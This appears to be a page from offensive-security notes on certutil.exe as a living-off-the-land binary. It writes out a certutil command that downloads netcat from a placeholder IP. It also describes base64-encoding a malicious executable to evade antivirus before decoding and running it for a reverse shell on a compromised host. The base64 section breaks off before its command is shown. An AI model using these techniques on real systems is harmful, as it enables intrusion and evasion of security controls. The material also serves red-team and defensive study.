============
Certutil.exe
============



.. index::
   single: Certutil
   single: Tools; Certutil
   single: File Transfer; Certutil

.. contents::
    :depth: 3
    :backlinks: top

####

--------
Certutil
--------

CertUtil.exe is installed as part of Certificate Services and can be used to manage certificates in
Windows.

With certutil you can perform various function related to certificates and certificate stores, such
as displaying certification authority (CA) configuration information, configure Certificate
Services, backup and restore CA components, and verify certificates, key pairs, and certificate
chains.

    .. important:: 
        
        Certutil is also known as a Living Off Land (LOL) binary which is a trusted, pre-installed
        system tool with ‘extra’ unexpected functionality, such as downloading files. An interesting
        feature of certutil is the option to download a remote certificate from a remote URL and
        save it to the local file system. While this feature is intended to download certificate
        files, **it can also be used to download non-certificate files with one simple command,
        including scripts and executables.**

It should not come as a surprise that this feature is heavily utilized in campaigns to download
malware which **can even bypass security programs and monitoring by base64 encoding the malicious
file and decoding it after it has been downloaded to the system.**

    .. note:: 
        
        **Transferring file with certutil.exe**


        
        .. code:: cmd
            :number-lines:
            :force:

             certutil -urlcache -split -f [URL] [Filename.Extension]

        **Options explained**

            * **-URLcache**: Displays or deletes URL cache entries.

            * **-f**: Forces fetching a specific URL and updating the cache.

            * **-split**: Split embedded ASN.1 elements, and save to files on disk.

    .. note:: 
        
        **exemple**

        an example where we download a file called nc.exe
        
        .. code:: cmd
            :number-lines:
            :force:

             certutil -urlcache -split -f http://[IP] nc.exe

        .. image:: images/Certutil.rst
           :width: 500 px
           :align: center

        The certutil program confirms that the command completed successfully.

####

-----------------------
Base64-encoded payloads
-----------------------

Another nice feature of CertUtil.exe that may **help to bypass security controls** is the option to
decode Base64-encoded files to the file system.

Using the **-decode** option, we can download a Base64-encoded malicious executable as text file and
decode the executable to disk. This may help in effectively bypassing security controls such as
antivirus, edge devices and filtering.

Let us demonstrate this with an example where we have a Base64-encoded text file of the nc.exe
executable, transfer it to the compromised Windows host, decode it back to an executable and finally
execute it for a reverse shell.

    .. note:: 

       The following figure is a diagram of the process:

       .. image:: images/Base64-encoded-payloads-WM.jpg
           :width: 500 px
           :align: center

First, we need to Base64-encode the Netcat executable. The command to Base64-encode files with
CertUtil.exe.



####

--------
Weblinks
--------

.. target-notes::